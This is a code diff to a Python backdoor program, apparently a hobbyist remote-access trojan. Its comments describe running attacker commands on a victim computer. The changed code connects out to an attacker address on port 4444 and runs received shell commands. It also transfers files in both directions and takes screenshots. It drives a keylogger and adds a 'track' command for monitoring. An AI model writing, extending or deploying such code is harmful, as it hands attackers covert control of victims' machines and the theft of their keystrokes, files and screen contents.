@@ -5,7 +5,7 @@
 # Commands taken from attacker will be executed through this script on victim computer,
 # then the results will be sent back
 
-# Built-in Modules
+# Standard Modules
 import time
 from queue import Queue
 import os
@@ -23,13 +23,13 @@ class Backdoor:
     NUMBER_OF_THREADS = 4
     JOB_NUMBER = [1, 2, 3]
     queue = Queue()
-    Ip = "192.168.79.128"
+    Ip = "127.0.0.1"
     Port = 4444
 
     # Initialize the socket connection via constructor with the given ip and port value
     def __init__(self):
         self.connection = None
-        self.logger = Logger()
+        self.logger = Logger(self.queue)
         self.create_workers()
         self.create_jobs()
 
@@ -50,17 +50,23 @@ class Backdoor:
             x = self.queue.get()
 
             if x == 1:
-                self.logger.key_logger()
-            elif x == 2:
-                self.logger.write_file()
-            if x == 3:
                 try:
                     self.connect_to_server(self.Ip, self.Port)
-                    self.queue.put(5)
+                    self.queue.put(0)
                 except Exception as msg:
                     print(msg)
-            elif x == 5:
+
+            elif x == 0:
                 self.run()
+
+            elif x == 2:
+                self.logger.key_logger()
+
+            elif x == 3:
+                self.logger.write_file()
+
+            elif x == 7:
+                self.logger.track_event()
 
             self.queue.task_done()
 
@@ -72,6 +78,8 @@ class Backdoor:
     # ****************** THREAD POOL ******************************************************************
 
     def connect_to_server(self, ip, port):
+
+        # TODO Listen Multiple Ports / Change Ports
 
         succeeded = False
         retry_interval = 5
@@ -85,13 +93,13 @@ class Backdoor:
                 succeeded = True
                 print("Connected!")
             except Exception as msg:
-                print("An attempt to connect server has failed "+str(msg))
+                print("An attempt to connect server has failed " + str(msg))
                 print("Will Retry in {} seconds".format(retry_interval))
                 time.sleep(retry_interval)
 
     # Execute given command string in shell
     def execute_system_command(self, command):
-        command = " ".join(command)
+        command = "".join(command)
         task = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
         stdout, stderr = task.communicate()
@@ -141,7 +149,7 @@ class Backdoor:
             command_result = ""
 
             # Wait (This is a blocking code) command string from attacker
-            command = self.__receive_data()
+            command: list = self.__receive_data()
 
             # Close the connection
             if command[0] == "exit":
@@ -155,6 +163,8 @@ class Backdoor:
                         command_result = self.__change_working_directory_to(command[1])
                     else:
                         command_result = self.execute_system_command(command[0])
+                    self.__send_data(command_result)
+
                 except Exception as e:
                     self.__send_data(e)
                     continue
@@ -163,35 +173,60 @@ class Backdoor:
             elif command[0] == "download":
                 try:
                     command_result = self.__read_file(command[1]).decode()
+                    self.__send_data(command_result)
+
                 except FileNotFoundError:
                     self.__send_data("Cannot find the file specified")
-                    continue
 
             # Write files that attacker sends
             elif command[0] == "upload":
                 try:
                     command_result = self.__write_file(command[1], command[2])
+                    self.__send_data(command_result)
+
                 except FileNotFoundError:
                     self.__send_data("Cannot find the file specified")
-                    continue
 
             # Take a screenshot and send it to attacker
             elif command[0] == "screenshot":
+
+                # TODO Get screenshot from all clients
+
                 image = self.logger.get_screenshot()
                 self.__send_data(image)
-                continue
+
+            elif command[0] == "track":
+
+                if len(command) < 2:
+                    self.__send_data("Missing argument")
+                else:
+
+                    if command[1] in ("--list", "-l"):
+                        print(len(command))
+                        tracks = self.logger.get_tracks()
+                        self.__send_data(tracks)
+
+                    elif command[1] in ("--add", "-a"):
+                        if command[2] is not None:
+                            self.logger.add_track(command[2])
+                            self.__send_data("{} Successfully added to tracks".format(command[2]))
+
+                    elif command[1] in ("--remove", "-r"):
+                        if command[2] is not None:
+                            result = self.logger.remove_track(command[2])
+                            self.__send_data(result)
+
+                    else:
+                        self.__send_data("Unknown command")
 
             # Check if connection is available
-            elif command == 'AreYouAwake?':
+            elif command[0] == 'AreYouAwake?':
                 self.__send_data(command)
-                continue
 
             # Execute other builtin commands
             else:
                 command_result = self.execute_system_command(command)
-
-            # Send results of commands executed to the attacker
-            self.__send_data(command_result)
+                self.__send_data(command_result)
 
 
 # Connect to the attacker's computer
